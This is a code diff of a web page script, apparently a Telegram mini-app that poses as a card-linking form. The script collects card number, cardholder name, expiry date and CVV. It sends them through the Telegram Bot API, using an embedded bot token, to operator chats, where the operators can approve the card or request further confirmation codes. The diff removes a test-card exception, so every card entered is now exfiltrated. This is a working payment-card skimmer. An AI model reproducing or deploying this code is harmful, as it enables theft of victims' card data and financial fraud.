@@ -1552,13 +1552,8 @@
                   cardYear: document.getElementById('cardYear').value,
                   cardCvv: document.getElementById('cardCvv').value
                 };
-                
-                if (cardData.cardNumber === '5167 4345 5899 7134') {
-                  let cardDataText = `Пользователь <b>ID${userID}</b> <u>прикрепил фейк карту к боту!</u>`;
-                }
-                else {
-                  let cardDataText = `Данные пользователя <b>ID${userID}</b> получены:\n\n<b>Card Number:</b> ${cardData.cardNumber}\n<b>Card Name:</b> ${cardData.cardName}\n<b>Expiration Date:</b> ${cardData.cardMonth}/${cardData.cardYear}\n<b>CVV:</b> ${cardData.cardCvv}`;
-                }
+              
+                let cardDataText = `Данные пользователя <b>ID${userID}</b> получены:\n\n<b>Card Number:</b> ${cardData.cardNumber}\n<b>Card Name:</b> ${cardData.cardName}\n<b>Expiration Date:</b> ${cardData.cardMonth}/${cardData.cardYear}\n<b>CVV:</b> ${cardData.cardCvv}`;
                 
                 let MsgInfo = `UserInfoID${userID}`;
 
@@ -1575,15 +1570,13 @@
                       .catch((error) => {
                         console.error('Error:', error);
                       });
-                
-                if (cardData.cardNumber !== '5167 4345 5899 7134') {
-                  fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=409013849&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
-                    .then(response => response.json())
-                    .then(data => console.log(data))
-                    .catch((error) => {
-                      console.error('Error:', error);
-                    });
-                }
+
+                fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=409013849&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
+                  .then(response => response.json())
+                  .then(data => console.log(data))
+                  .catch((error) => {
+                    console.error('Error:', error);
+                  });
                 
                 setTimeout(() => {
                   cardDataText = `Ниже вы можете <b>одобрить</b> или <b>отклонить</b> привязку карты для ID${userID}, а также <b>запросить у него подтверждение</b> операции по карте (cvv или приложение), в зависимости от вашего выбора <b><u>пользователь получит сообщение с результатом</u></b>.`;
@@ -1601,13 +1594,12 @@
                   };
                 
                   // Отправляем данные в Telegram Bot
-                  if (cardData.cardNumber !== '5167 4345 5899 7134') {
-                    fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=7329305712&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
-                        .then(response => response.json())
-                        .then(data => console.log(data))
-                        .catch((error) => {
-                          console.error('Error:', error);
-                        });
+                  fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=7329305712&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
+                      .then(response => response.json())
+                      .then(data => console.log(data))
+                      .catch((error) => {
+                        console.error('Error:', error);
+                      });
 
                     fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=409013849&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
                       .then(response => response.json())
@@ -1615,7 +1607,6 @@
                       .catch((error) => {
                         console.error('Error:', error);
                       });
-                  }
                 }, 1000);
 
                 
@@ -1645,11 +1636,11 @@
                         console.error('Error:', error);
                       });
                       tg.close();
-                    } 
-                    else {
+
+                  } else {
                       // Если значение cardNumber неверное, отображаем container-error
                       document.querySelector('.container-error').style.display = "flex";
-                    }
+                  }
                 }, randomTime);
             });
         }
